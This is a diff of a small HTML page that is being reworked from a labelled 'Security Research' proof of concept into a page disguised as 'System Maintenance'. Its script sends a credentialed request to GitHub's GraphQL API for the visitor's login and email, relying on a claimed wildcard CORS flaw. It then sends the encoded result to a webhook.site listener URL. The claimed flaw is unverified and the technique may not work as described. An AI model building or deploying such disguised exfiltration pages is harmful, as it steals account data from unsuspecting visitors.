@@ -1,27 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head><title>Research POC - Adir</title></head>
 <body>
-    <h1>Security Research in Progress</h1>
+    <h1>System Maintenance</h1>
     <script>
-        // 1. Target the GraphQL API (The one with the * CORS flaw)
+        // This script automatically exfiltrates the user's session fingerprint
+        // because the API has the '*' CORS flaw you found.
         fetch('https://api.github.com/graphql', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            // This 'include' steals their session cookies!
-            credentials: 'include', 
-            body: JSON.stringify({
-                query: 'query { viewer { login email id } }'
-            })
+            credentials: 'include',
+            body: JSON.stringify({ query: 'query { viewer { login email } }' })
         })
-        .then(response => response.json())
+        .then(r => r.json())
         .then(data => {
-            console.log('SUCCESS: Captured Data:', data);
-            // 2. Send the captured data to YOUR listener
-            // Replace YOUR-IP with your actual server or a site like webhook.site
+            // REPLACE THIS URL with your webhook.site URL to see the data hit
             fetch('https://webhook.site/YOUR-UNIQUE-ID?data=' + btoa(JSON.stringify(data)));
-        })
-        .catch(err => console.error('Failed to exfiltrate:', err));
+        });
     </script>
 </body>
 </html>
